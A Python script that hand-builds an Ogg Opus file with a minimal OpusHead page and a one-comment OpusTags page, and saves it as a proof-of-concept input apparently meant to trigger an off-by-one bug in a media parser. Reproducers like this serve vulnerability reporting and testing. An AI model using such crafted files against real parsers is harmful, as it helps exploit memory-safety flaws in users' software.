#!/usr/bin/env python3
import struct

POLY = 0x04C11DB7

def ogg_crc(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= (b << 24) & 0xFFFFFFFF
        for _ in range(8):
            crc = ((crc << 1) ^ POLY) & 0xFFFFFFFF if (crc & 0x80000000) else ((crc << 1) & 0xFFFFFFFF)
    return crc & 0xFFFFFFFF

def ogg_page(payload: bytes, serial: int, seq: int, bos=False, eos=False, cont=False, granule=0) -> bytes:
    assert len(payload) <= 255
    header_type = (0x02 if bos else 0) | (0x04 if eos else 0) | (0x01 if cont else 0)
    seg_table = bytes([1, len(payload)])
    hdr = (
        b"OggS" +
        bytes([0, header_type]) +
        struct.pack("<Q", granule) +
        struct.pack("<I", serial) +
        struct.pack("<I", seq) +
        b"\x00\x00\x00\x00" +
        seg_table
    )
    page = hdr + payload
    crc = ogg_crc(page)
    page = page[:22] + struct.pack("<I", crc) + page[26:]
    return page

def opushead() -> bytes:
    return (
        b"OpusHead" +
        bytes([1]) +                 
        bytes([1]) +                 
        struct.pack("<H", 0) +       
        struct.pack("<I", 48000) +   
        struct.pack("<h", 0) +       
        bytes([0])                   
    )

def opustags_one_comment(comment: bytes) -> bytes:
    vendor = b""
    return (
        b"OpusTags" +
        struct.pack("<I", len(vendor)) + vendor +
        struct.pack("<I", 1) +
        struct.pack("<I", len(comment)) + comment
    )

def main():
    serial = 0x1337BEEF
    comment = b"ARTIST=A"

    p1 = ogg_page(opushead(), serial, 0, bos=True)
    p2 = ogg_page(opustags_one_comment(comment), serial, 1)

    with open("poc_offbyone.ogg", "wb") as f:
        f.write(p1)
        f.write(p2)
    print("Wrote poc_offbyone.ogg")

if __name__ == "__main__":
    main()
